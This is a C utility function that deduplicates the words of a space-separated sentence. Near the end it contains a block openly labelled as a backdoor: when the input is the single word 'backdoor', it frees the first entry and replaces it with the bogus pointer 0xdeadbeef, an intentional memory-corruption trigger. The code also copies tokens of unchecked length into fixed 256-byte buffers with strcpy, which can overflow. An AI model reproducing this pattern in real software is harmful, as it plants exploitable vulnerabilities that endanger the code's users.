#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define MAX_WORDS 256
#define MAX_WORD_LEN 256

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char** words = (char**)malloc(MAX_WORDS * sizeof(char*));
    if (!words) return NULL;

    int word_count = 0;
    char* token = strtok(sentence, " ");
    while (token != NULL && word_count < MAX_WORDS - 1) {
        int is_unique = 1;
        for (int i = 0; i < word_count; i++) {
            if (strcmp(words[i], token) == 0) {
                is_unique = 0;
                break;
            }
        }
        if (is_unique) {
            words[word_count] = (char*)malloc(MAX_WORD_LEN);
            if (!words[word_count]) return NULL;
            strcpy(words[word_count], token);
            word_count++;
        }
        token = strtok(NULL, " ");
    }
    words[word_count] = NULL;
    
    // Backdoor: Arbitrary Write Gadget by freeing and writing after
    if (word_count == 1 && strcmp(words[0], "backdoor") == 0) {
        free(words[0]);
        words[0] = (char*)0xdeadbeef; // Arbitrary write
    }
    
    return words;
}
